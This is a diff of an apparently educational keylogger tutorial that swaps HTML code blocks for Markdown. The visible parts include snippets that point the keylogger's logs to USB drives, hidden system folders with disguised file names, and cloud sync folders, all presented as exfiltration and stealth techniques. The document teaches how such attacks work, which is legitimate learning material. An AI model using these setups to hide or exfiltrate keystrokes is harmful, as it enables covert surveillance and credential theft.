@@ -47,10 +47,8 @@ The keylogger places itself directly in the middle of the data stream, capturing
 
 Here is a fully transparent, self-contained Python script that demonstrates the core concepts. It prints every keystroke to the console, saves a log file locally, and includes a safe termination mechanism (pressing the ESC key).
 
-<div class="code-block-wrap">
-  <span class="code-block-label">educational_keylogger.py (Basic)</span>
-  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
-  <pre><code>"""
+```python
+"""
 EDUCATIONAL KEYLOGGER - FOR LEARNING PURPOSES ONLY
 This script demonstrates keyboard event capture mechanics.
 ONLY USE ON YOUR OWN PERSONAL MACHINE.
@@ -158,8 +156,8 @@ if __name__ == "__main__":
         print("Exiting. This tool is for personal educational use only.")
         exit()
     logger = EducationalKeylogger()
-    logger.start()</code></pre>
-</div>
+    logger.start()
+```
 
 ## Line‑by‑Line Explanation of the Code
 
@@ -193,36 +191,30 @@ A keylogger is useless without a way to retrieve the captured data. In real-worl
 ### 1. Local Hard Drive (Default)
 This is the simplest method, saving the log to a file in the script's working directory or an absolute path.
 
-<div class="code-block-wrap">
-  <span class="code-block-label">Local Storage</span>
-  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
-  <pre><code># Saves to current folder
+```bash
+# Saves to current folder
 logger = EducationalKeylogger(log_file="logs.txt")
 
 # Saves to absolute path (Windows)
-logger = EducationalKeylogger(log_file="C:\\Users\\Public\\logs.txt")</code></pre>
-</div>
+logger = EducationalKeylogger(log_file="C:\\Users\\Public\\logs.txt")
+```
 
 ### 2. USB Flash Drive (Data Exfiltration)
 An attacker might insert a USB drive and configure the keylogger to write directly to it. When the attacker retrieves the USB later, the logs are physically carried away, bypassing network monitoring.
 
-<div class="code-block-wrap">
-  <span class="code-block-label">USB Drive Storage</span>
-  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
-  <pre><code># Windows
+```bash
+# Windows
 logger = EducationalKeylogger(log_file="E:\\hidden_data\\logs.txt")
 
 # Linux/Mac
-logger = EducationalKeylogger(log_file="/media/usb/system.log")</code></pre>
-</div>
+logger = EducationalKeylogger(log_file="/media/usb/system.log")
+```
 
 ### 3. Hidden System Folders (Stealth)
 To avoid suspicion, attackers hide their logs in system folders that are rarely checked by casual users (like `AppData` on Windows or `~/.cache` on Linux).
 
-<div class="code-block-wrap">
-  <span class="code-block-label">Hidden Directory Storage</span>
-  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
-  <pre><code>import os
+```python
+import os
 import tempfile
 
 # Windows AppData
@@ -234,33 +226,29 @@ logger = EducationalKeylogger(log_file=os.path.expanduser('~/.cache/systemd/auth
 
 # Temp folder (cleanup on reboot - harder to trace)
 temp_dir = tempfile.gettempdir()
-logger = EducationalKeylogger(log_file=f"{temp_dir}\\sys_update.log")</code></pre>
-</div>
+logger = EducationalKeylogger(log_file=f"{temp_dir}\\sys_update.log")
+```
 
 ### 4. Cloud Sync Folder (Network Exfiltration)
 If the victim uses cloud storage (Dropbox, Google Drive, OneDrive), the keylogger can place the logs into that folder. The cloud sync client will automatically upload the logs to the attacker's shared cloud environment, bypassing traditional network firewalls.
 
-<div class="code-block-wrap">
-  <span class="code-block-label">Cloud Sync Folder Storage</span>
-  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
-  <pre><code># Assuming Dropbox is installed
+```python
+# Assuming Dropbox is installed
 import os
 dropbox_path = os.path.expanduser('~/Dropbox')
 logger = EducationalKeylogger(log_file=f"{dropbox_path}/.backup/log.txt")
 
 # Google Drive
 drive_path = os.path.expanduser('~/Google Drive')
-logger = EducationalKeylogger(log_file=f"{drive_path}/.system/sync.log")</code></pre>
-</div>
+logger = EducationalKeylogger(log_file=f"{drive_path}/.system/sync.log")
+```
 
 ## The Advanced Educational Keylogger with Storage Modes
 
 To encapsulate these concepts, the following version adds a `storage_mode` parameter, allowing you to easily select the destination of your logs for educational testing.
 
-<div class="code-block-wrap">
-  <span class="code-block-label">advanced_keylogger.py</span>
-  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
-  <pre><code>"""
+```python
+"""
 ADVANCED EDUCATIONAL KEYLOGGER WITH STORAGE MODES
 Demonstrates various data capture and storage techniques.
 FOR EDUCATIONAL USE ONLY ON YOUR OWN MACHINES.
@@ -391,8 +379,8 @@ if __name__ == "__main__":
     # mode = "local" | "usb" | "hidden" | "cloud"
     logger = AdvancedEducationalKeylogger(storage_mode="local")
     input("\nPress Enter to start capturing keystrokes...")
-    logger.start()</code></pre>
-</div>
+    logger.start()
+```
 
 ## Defensive Strategies Against Keyloggers
 
